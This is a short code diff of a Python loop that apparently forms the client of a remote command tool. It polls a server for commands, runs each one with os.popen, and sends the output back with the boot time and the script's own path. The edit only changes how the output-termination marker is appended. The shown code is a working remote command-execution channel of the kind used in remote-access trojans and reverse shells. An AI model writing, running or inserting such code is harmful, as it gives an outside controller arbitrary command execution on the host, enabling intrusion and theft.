@@ -156,15 +156,14 @@ while(True == True):
                 output += "\nBoot time         : "+boot_time
                 output += "\nConnection status : Connected"
                 output += "\nRunning path      : "+os.path.realpath(__file__)
-                download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;'))
+                download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
             else:
                 if(response[0]['input'] == "reboot"):
                     output = "Reboot sequence initiated"
-                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;'))
+                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
                     terminate()
                 else:
                     doPrint("("+response[0]['session_id']+") >> "+response[0]['input'].replace(';quote;', '"'))
                     output = os.popen(response[0]['input'].replace(';quote;', '"').replace(';and;', '&')).read()
-                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;'))
-                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output=000-terminate-000")
+                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
 terminate()
